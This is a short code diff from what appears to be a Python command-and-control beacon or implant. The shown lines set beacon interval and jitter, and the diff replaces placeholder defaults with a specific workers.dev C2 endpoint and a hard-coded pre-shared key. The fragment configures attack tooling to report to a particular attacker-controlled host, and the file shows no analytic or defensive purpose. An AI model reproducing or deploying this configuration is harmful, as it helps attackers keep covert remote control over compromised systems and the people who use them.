@@ -59,8 +59,8 @@ from Crypto.Random import get_random_bytes
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-WORKER_URL = os.environ.get("WORKER_URL",    "https://your-worker.workers.dev")
-PSK        = os.environ.get("C2_PSK",        "changeme")
+WORKER_URL = os.environ.get("WORKER_URL", "https://cipherfall-c2.cipherfall-c2.workers.dev/")
+PSK        = os.environ.get("C2_PSK",     "CeciEstMonPSK")
 BEACON_INT = int(os.environ.get("C2_INT",    "30"))
 JITTER     = int(os.environ.get("C2_JITTER", "10"))
 
